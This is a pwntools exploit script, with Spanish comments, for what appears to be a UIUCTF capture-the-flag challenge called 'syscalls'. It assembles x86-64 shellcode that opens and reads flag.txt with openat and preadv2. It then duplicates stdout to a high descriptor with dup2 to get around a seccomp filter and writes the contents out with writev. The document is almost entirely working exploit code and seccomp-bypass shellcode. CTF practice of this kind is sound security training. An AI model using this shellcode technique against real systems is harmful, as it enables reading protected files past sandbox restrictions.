from pwn import *

gs = '''
continue
'''

elf = context.binary = ELF("./syscalls")

def start():
    if args.REMOTE:
        return remote("syscalls.chal.uiuc.tf", 1337, ssl=True)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

context.terminal = ['gnome-terminal', '-e']

flag = str()

# Necesitaremos armar:
# struct iovec
# {
#   void *iov_base     // Direccion de inicio
#   size_t iov_len     // Tama√±o de la memeoria que apunta a iov_base
# }

# Lo haremos con:
# mov r12, rsp
# mov r13, r12       
# sub r13, 64        
# mov qword ptr[r12], r13   ; Direccion de inicio *iov_base
# mov qword ptr[r12 + 8], 64  ; 64 bits de espacio para escribir en la pila (iov_len)

# Exploit:
# Recuerda r12 es nuestro struct iovec
# openat(-100, "flag.txt", 0)
# preadv2("<descriptor del openat mov rdi, rax>", r12, 1, 0, 0)
# Usamos dup2 porque vamos convertir nuestro descriptor 1 <stdout> a uno mayor o igual a 0x3e8(Vee las restricciones de seccomp)
# dup2(1, 0x3e9)
# writev(0x3e9, r12, 0)

def main():
    io = start()

    shellcode = f"""
        _start:
        
            xor  rdx, rdx
            push rdx
            mov  rsi, {u64(b"flag.txt")}
            push rsi
            mov  rsi, rsp
            xor  rdi, rdi
            sub  rdi, 100
            mov  rax, 0x101
            syscall

            mov r12, rsp
            mov r13, r12
            sub r13, 64

            mov qword ptr[r12], r13
            mov qword ptr[r12 + 8], 64

            mov rdi, rax
            xor r8, r8
            xor r10, r10
            mov rdx, 1
            mov rsi, r12
            mov rax, 0x147
            syscall
    
            mov rsi, 0x3e9
            mov rdi, 1
            mov rax, 0x21
            syscall

            mov rdi, 0x3e9
            mov rsi, r12
            mov rax, 0x14
            syscall

        """


    shellcode = asm(shellcode)

    f = open("payload", "wb")
    f.write(shellcode.ljust(175, b"\x00"))
    f.close()

    io.recvline()

    io.sendline(shellcode)

    io.interactive()

main()
